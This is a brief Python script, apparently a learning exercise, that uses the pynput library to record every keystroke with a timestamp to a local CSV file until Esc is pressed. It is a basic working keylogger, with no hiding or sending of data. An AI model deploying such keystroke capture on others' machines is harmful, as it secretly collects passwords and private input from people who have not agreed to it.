from pynput import keyboard
import datetime

list = []

def on_press(key):
    try:
        x = datetime.datetime.now()
        dt = x.strftime("%Y-%m-%d %H:%M:%S")
        print(key.char)
        print(type(key))
        f = open("keylog.csv", "a")
        f.write(f"{dt}  |  {key.char} \n")




    except AttributeError:
        x = datetime.datetime.now()
        dt = x.strftime("%Y-%m-%d %H:%M:%S")
        print(f"{key}")
        f = open("keylog.csv", "a")
        print(type(key))
        f.write(f"{dt}  |  {key}\n")


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
        ) as listener:
    listener.join()
    print(list)


# ...or, in a non-blocking fashion:
'''
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
'''
